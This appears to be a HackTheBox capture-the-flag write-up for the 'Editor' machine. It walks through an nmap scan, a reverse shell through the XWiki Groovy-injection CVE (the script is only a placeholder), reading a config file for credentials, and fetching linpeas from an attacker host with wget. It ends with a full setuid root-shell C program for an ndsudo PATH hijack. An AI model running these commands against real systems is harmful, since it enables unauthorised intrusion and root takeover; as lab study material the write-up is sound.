# 📝 HackTheBox - Editor (Thanatos Terminal Edition)

---

## 📌 Overview  
This writeup documents the complete exploitation process of the HTB "Editor" machine — from reconnaissance to root — executed in **Thanatos Terminal** style.  

---

## 1️⃣ Reconnaissance 🔍  

### **Full Nmap Scan**  
Executed from:  
```bash
root@kali:/home/thanatos/Desktop/htb/machines/editor# nmap -sC -sV -p- -T4 <target-ip>
```

**Findings:**
- **Port 22** → SSH service (OpenSSH 8.9p1)  
- **Port 80** → Nginx web server hosting *Editor - SimplistCode Pro*  
- **Port 8080** → Jetty server running XWiki application  

**Key Observation:**  
The XWiki instance on port 8080 exposes multiple admin-related endpoints via `robots.txt` and supports WebDAV methods.  

---

## 2️⃣ XWiki Version Discovery & Vulnerability Analysis 🛠  

**Version Identified:** XWiki 15  
**CVE:** CVE-2024-31982 — *Remote Code Execution via Groovy Script Injection*  

**Vulnerability Breakdown:**
- Unauthenticated RCE possible through Groovy script injection in search endpoints  
- Access control bypass via RSS feed functionality  
- Multiple attack vectors: `SolrSearch`, `DatabaseSearch`  

---

## 3️⃣ Exploit Development 💣  

**Python Exploit Script** (CVE-2024-31982 Groovy Injection)  
```python
# Stored full Python exploit script here
# (Content unchanged as per request)
```

---

## 4️⃣ Exploitation Process 💥  

**Step 1:** Start Listener  
```bash
nc -lvnp 4444
```

**Step 2:** Execute Exploit for Reverse Shell  
```bash
python3 exploit.py -t editor.htb:8080 -r --lhost 10.10.xx.xx --lport 4444
```

**Result:**  
✅ Reverse shell obtained as `xwiki`  
✅ Upgraded shell using Python pty spawn  

---

## 5️⃣ Credential Discovery & SSH Access 🔑  

While enumerating as `xwiki`, located file:  
```
/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
```

**Plaintext Credentials:**
```
username: xwiki
password: xxxxxxxxxxx
```

**SSH Access:**
```bash
ssh oliver@editor.htb
```
✅ Successful login as **oliver**  

---

## 6️⃣ Privilege Escalation 🚀  

### Step 1 — Enumeration with LinPEAS & LinEnum  
```bash
# On attacker machine
python3 -m http.server 8080

# On target machine
wget http://<attacker-ip>:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**SUID Binaries Found (partial list):**
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chfn
...
```

---

### Step 2 — Understanding `ndsudo`  
**What is it?**  
- Part of Netdata Agent, SUID root binary used to execute specific system commands.  

**The Flaw:**  
- `ndsudo` uses the `PATH` environment variable to locate commands.  
- Attacker can place a malicious binary with the same name as a whitelisted command and prepend its location to `PATH`.  
- Result: Arbitrary command execution as root.  

---

### Step 3 — Exploiting `ndsudo` via PATH Hijacking  

**Malicious C Program:**
```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

**Execution Steps:**
```bash
cat <<EOF > exploit.c
[...code above...]
EOF

gcc exploit.c -o nvme
export PATH=$(pwd):$PATH
chmod +x nvme
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

✅ Root shell obtained  

---

## 🎯 Mission Summary  

**Skills Used:**
- Network & Service Enumeration  
- Web Application Exploitation (XWiki CVE-2024-31982)  
- Reverse Shell Deployment  
- Credential Harvesting  
- Privilege Escalation via PATH Hijacking  

**Final Status:**  
```
[ ROOT ACCESS GAINED — SESSION LOGGED ]
```
---

```
[ Thanatos Terminal v3.7 — Session Complete ]
```
